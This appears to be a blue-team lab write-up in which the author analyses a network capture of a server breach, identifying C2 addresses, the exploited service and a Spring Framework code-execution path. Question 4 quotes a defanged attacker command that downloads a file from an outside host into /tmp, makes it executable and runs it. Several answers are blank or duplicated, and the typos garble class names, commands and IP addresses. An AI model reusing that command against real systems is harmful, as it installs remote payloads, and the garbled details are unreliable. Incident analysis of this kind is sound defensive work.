<h2>Question 1 </h2>
<b>By identifying the C2 IP, we can block traffic to and from this IP, helping to contain the breach and prevent further data exfiltration or command execution. Can you provide the IP of the C2 server that communicated with our server?</b>

<br>First of all, lets check to see the conversations that was captured in this PCAP. Under the statistics tab, navigate to the Conversions and you will notice that a particular communication involved large transmission of packets from the source IP address to a particular destination IP address on port 443 and given that data exfiltration is being investigated. So, this communication seems obvious.

<p align="center">
<img src="https://imgur.com/6yjWjrD.png" height="100%" width="80%" alt="C2 Server"/> 
<br />

<h2>Question 2 </h2>
<b>Initial entry points are critical to trace back the attack vector. What is the port number of the service the adversary exploited?</b>

<br>The C2 server connected to a destination host on a particular port. That port the entry port.<br />
<p align="center">
<img src="https://imgur.com/KWEKvHX.png" height="100%" width="80%" alt="IP2location INFO"/> 
<br />

<h2>Question 3 </h2>
<b>Following up on the previous question, what is the name of the service found to be vulnerable?</b>
<br>With reference to question 2, follow the TCP stream to get the name of the service or simply google the service that runs by default on exploited port

<p align="center">
<img src="https://imgur.com/z8Pe7HA.png" height="100%" width="80%" alt="Dst_port"/> 
<br />

<h2>Question 4 </h2>
<b>The attacker's infrastructure often involves multiple components. What is the IP of the second C2 server? </b><br />
<br> We followed a TCP stream in question 3 and noticed that a URL path hxxp://]146[.]198[.]21[.]92:8888/invoice.xml pointing to an XML file named <b>invoice.xml</b> which seems to be path to an application configuration file. Using the "org.springframework.context.support.ClassPathXnlApplicationContext" which is a class from the Spring Framework used for loading application contexts fron X files to load the invoice.xml file. Now follow HTTP stream the frame that contains the URL, you will notice an enbedded script <b>"curls-o/trp/docker hxxp://1120[.]199[.]52[.]72/docker; chsod +x /tmp/docker; /tmp/docker"</b> which downloads the file "docker" silently from hxxp://]128[.]199[.]52[.]72/docker to the path /tmp/docker and then elevates its privilege by making it an executable and then executes the script.

<p align="center">
<img src="https://imgur.com/TiajAMr.png" height="100%" width="80%" alt="Enumeration_tool"/> 
</br>

<h2>Question 5 </h2>
<b>Attackers usually leave traces on the disk. What is the name of the reverse shell executable dropped on the server?</b><br />
<br> 
<p align="center">
<img src="https://imgur.com/XdVB8w8.png" height="100%" width="80%" alt="Admin_directory"/> 
<br/>

<h2>Question 6 </h2>
<b>What is the vulnerable Java method and class that allows an attacker to run arbitrary code? (Format: Class.Method)</b><br />
<br> <br />

<p align="center">
<img src="https://imgur.com/OPcixPu.png" height="100%" width="80%" alt="Credentials"/> 
<br />

  
<h2>Question 7 </h2>
<b>To better understand the specific security flaw exploited, can you identify the CVE identifier associated with this vulnerability?</b><br />
<br>

<p align="center">
<img src="https://imgur.com/yANADqF.png" height="100%" width="80%" alt="Attacker's file_upload"/> 
<br />

<p align="center">
<img src="https://imgur.com/SgCoYCq.png" height="100%" width="80%" alt="Attacker's file_upload"/> 
<br />
<h2>Question 8 </h2>
<b>What is the vulnerable Java method and class that allows an attacker to run arbitrary code? (Format: Class.Method)</b><br />
<br> 
<p align="center">
<img src="https://imgur.com/QCZlkGx.png" height="100%" width="80%" alt="persistence_command"/> 
<br />



